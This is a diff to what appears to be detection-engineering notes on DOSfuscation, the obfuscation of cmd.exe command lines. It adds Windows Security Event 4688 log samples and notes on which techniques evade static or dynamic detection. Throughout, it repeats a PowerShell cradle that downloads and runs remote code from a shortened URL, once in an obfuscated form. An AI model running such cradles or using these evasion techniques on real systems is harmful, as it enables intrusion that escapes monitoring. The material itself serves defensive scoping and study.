@@ -53,6 +53,7 @@ The framework provides 3 main obfuscation options:
 * PAYLOAD - Obfuscated payload via DOSfuscation
 
 ### BINARY
+#### Environment Variable Substrings
 One way to obfuscate the string PowerShell in this example command:
 ```CMD
 cmd.exe /c “powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
@@ -80,6 +81,25 @@ This is how it's going to look in WEL Security Event ID 4688:
   <Data Name="CommandLine">"C:\Windows\system32\cmd.exe" /c "powe%ALLUSERSPROFILE:~4,1%shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)" </Data> 
   </EventData>
 ```
+However in child Process Creation WEL Security Event ID 4688 existing environment variables resolve to their underlying value when executed by cmd.exe, even when substring syntax is used:
+```XML
+- <EventData>
+  <Data Name="SubjectUserSid">S-1-5-21-260327305-1582946090-2061753030-500</Data> 
+  <Data Name="SubjectUserName">admin</Data> 
+  <Data Name="SubjectDomainName">WIN-JHK6BC88K34</Data> 
+  <Data Name="SubjectLogonId">0x1cf8c72</Data> 
+  <Data Name="NewProcessId">0x10d8</Data> 
+  <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
+  <Data Name="TokenElevationType">%%1936</Data> 
+  <Data Name="ProcessId">0xa44</Data> 
+  <Data Name="CommandLine">powershell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)</Data> 
+  </EventData>
+```
+So this subtype of binary obfuscation is considered out of scope for this Issue.
+
+#### For Loop Value Extraction
+It is possible to construct a binary name like cmd or PowerShell in memory that does not resolve on cmd.exe’scommand line upon execution, evading both static and dynamic detections focusing on the presence of these values.
+
 
 ### ENCODING
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
